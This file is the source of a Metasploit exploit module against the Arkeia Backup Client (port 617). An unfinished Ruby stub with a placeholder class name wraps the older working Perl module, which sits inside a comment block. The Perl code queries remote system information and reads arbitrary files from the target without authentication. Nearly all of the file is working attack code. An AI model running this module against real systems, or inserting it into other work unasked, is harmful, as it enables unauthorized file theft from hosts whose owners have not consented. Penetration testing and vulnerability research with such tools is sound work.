require 'msf/core'

module Msf

class Exploits::Windows::XXX_CHANGEME_XXX < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'Arkeia Backup Client Remote Access',
			'Description'    => %q{
				This module provides a number of functions for manipulating
				an Arkeia Backup Client installation.
					
			},
			'Author'         => [ 'hdm' ],
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'OSVDB', '15130'],
					[ 'URL', 'http://metasploit.com/research/arkeia_agent/'],
					[ 'MIL', '5'],

				],
			'Privileged'     => true,
			
			'Targets'        => 
				[
					[ 
						'Automatic Targetting',
						{
							'Platform' => 'any',
							'Ret'      => 0x0,
						},
					],
				],
			'DisclosureDate' => 'Feb 20 2005',
			'DefaultTarget' => 0))
	end

	def exploit
		connect
		
		handler
		disconnect
	end

=begin

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::arkeia_agent_access;
use base "Msf::Exploit";
use strict;
use Pex::Text;
use Pex::Arkeia;

my $advanced = { };

my $info =
{
	'Name'     => 'Arkeia Backup Client Remote Access',
	'Version'  => '$Revision$',
	'Authors'  => [ 'H D Moore <hdm [at] metasploit.com>' ],
	'Arch'     => [ ],
	'OS'       => [ ],
	
	'UserOpts' => 
	{
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 617],
		
		'RFILE' => [0, 'DATA', 'The remote file path'],
		'LFILE' => [0, 'DATA', 'The local file path'],
		'HNAME' => [0, 'DATA', 'The remote host name'],
	},

	'Description'  => Pex::Text::Freeform(qq{
		This module provides a number of functions for manipulating
		an Arkeia Backup Client installation.
	}),

	'Refs'    => 
	[
		['OSVDB', 15130],
		['URL', 'http://metasploit.com/research/arkeia_agent/'],
		['MIL', '5'],
	],
	
	'Targets' => 
	[
		['Read a file from the remote system',		'read'],
		['Display the remote system information',	'info'],
#		['Write a file to the remote system',		'write'],		
	],
	
	'Keys'    => ['arkeia'],

	'DisclosureDate' => 'Feb 20 2005',
};

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Check {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	
	my $s = Msf::Socket::Tcp->new
	(
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
	);

	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return $self->CheckCode('Connect');
	}
	
	$self->PrintLine("[*] Querying the Arkeia Backup Client...");
	my %info = Pex::Arkeia::ClientInfo($s);
	
	# Give up if we did not get a version response back
	if (! $info{'Version'} ) {
		$self->PrintLine("[*] Error: ". $info{'Error'});
		return $self->CheckCode('Unknown');
	}
	
	# Dump out the information returned by the server
	$self->PrintLine("[*] System Information");
	foreach my $inf (keys %info) {
		next if $inf eq 'Error';
		$self->PrintLine("      $inf: $info{$inf}");
	}

	return $self->CheckCode('Confirmed');
}


sub Exploit {
	my $self = shift;
	my $func = $self->Targets->[$self->GetVar('TARGET')];

	return $self->ARKRead()  if $func->[1] eq 'read';
	return $self->ARKWrite() if $func->[1] eq 'write';
	return $self->ARKInfo()  if $func->[1] eq 'info';
	
	$self->PrintLine("[*] Unknown attack type specified");
	return;
}

sub ARKRead {
	my $self = shift;
	my $path_rem    = $self->GetVar('RFILE');
	my $path_loc    = $self->GetVar('LFILE');
	
	my ($name, $drive, $path);
	my $s = $self->Connect || return;		

	$name = $self->GetEnv('HNAME');

	if (! $name) {
		$self->PrintLine("[*] Warning: The 'HNAME' option should be set to the remote host name");
	}

	# Handle Windows paths
	if ($path_rem =~ m/^([a-z]:)(\\.*)/i) {
		$drive = $1;
		$path  = $2;
		$path  =~ s:\\:/:g;
	}
	# Handle UNIX paths
	else {
		$drive = '/';
		$path  = $path_rem;
	}
	
	my %ret = Pex::Arkeia::GetFile($s, $name, $drive, $path);

	if (! $ret{'Data'}) {
		$self->PrintLine("[*] The file transfer failed due to an error");
		$self->PrintLine("[*] ".$ret{'Info'}) if $ret{'Info'};
		$self->PrintLine("[*] Error: ".$ret{'Error'}) if $ret{'Error'};		
		return;
	}
	
	# Quick and dirty way to pull the file contents out
	my ($fsize) = $ret{'Data'} =~ m/n_fsize\x00(\d+)\x00/ms;
	my $findex  = rindex($ret{'Data'}, "n_cksum\x00");
	my $fdata   = substr($ret{'Data'}, $findex - $fsize, $fsize);
	my $trunc   = $fsize;

	# If the file was truncated, we try to salvage what we can
	if ($findex == -1) {
		$self->PrintLine("[*] Warning: This file is greater than 65k and will be truncated");
		(undef, $trunc, $fdata) = $ret{'Data'} =~ m/n_(size|cmpatrr)\x00[^\x00]+\x00[^\x00]+\x00[^\x00]+\x00(\d{5})(.*)/msg;
		
		# Even more gross hacks
		if (! $trunc) {
			$self->PrintLine("[*] Could not determine the file start, dumping the entire response");
			$fdata = $ret{'Data'};
			$trunc = length($fdata);
		}
	}

	$self->PrintLine("[*] Transferred $trunc of $fsize bytes for $path_rem");

	if ($path_loc) {
		if (! open(TMP, '>'.$path_loc)) {
			$self->PrintLine("[*] Could not open local path $path_loc: $!");
			return;
		}
		print TMP $fdata;
		close(TMP);
		return;
	}
	
	$self->PrintLine("[*] Dumping file contents...");
	$self->PrintLine($fdata);
	return;
}

sub ARKWrite {
	my $self = shift;
	my $path_rem    = $self->GetVar('RFILE');
	my $path_loc    = $self->GetVar('LFILE');

	$self->PrintLine("[*] This feature is still under development");
	return;
		
	my $s = $self->Connect || return;
}

sub ARKInfo {
	my $self = shift;
	my $s = $self->Connect || return;
	
	$self->PrintLine("[*] Querying the Arkeia Backup Client...");
	my %info = Pex::Arkeia::ClientInfo($s);
	
	# Give up if we did not get a version response back
	if (! $info{'Version'} ) {
		$self->PrintLine("[*] Error: ". $info{'Error'});
		return;
	}
	
	# Dump out the information returned by the server
	$self->PrintLine("[*] System Information");
	foreach my $inf (keys %info) {
		next if $inf eq 'Error';
		$self->PrintLine("      $inf: $info{$inf}");
	}
	
	$s->Close;
	return;
}


sub Connect {
	my $self = shift;
	my $s = Msf::Socket::Tcp->new
	(
		'PeerAddr'  => $self->GetVar('RHOST'),
		'PeerPort'  => $self->GetVar('RPORT'),
	);

	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}
	
	return $s;
}
1;


=end


end
end	
